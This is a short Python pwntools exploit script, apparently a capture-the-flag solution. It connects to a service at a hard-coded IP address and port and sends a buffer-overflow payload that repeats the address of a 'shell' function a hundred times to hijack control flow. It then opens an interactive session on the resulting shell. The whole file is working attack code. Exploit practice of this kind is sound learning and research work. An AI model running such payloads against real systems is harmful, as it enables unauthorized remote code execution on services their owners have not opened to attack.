#!/usr/bin/python
# coding: utf-8
 
from pwn import *
 
shell = 0x080485cb
 
# nc 125.131.189.33 5005
p = remote("125.131.189.33", 5005)
# p = process("./bof")
 
print p.recv(1024)
 
payload = "1\x00\x00\x00"
payload += p32(shell) * 100
p.sendline(payload)
p.interactive()
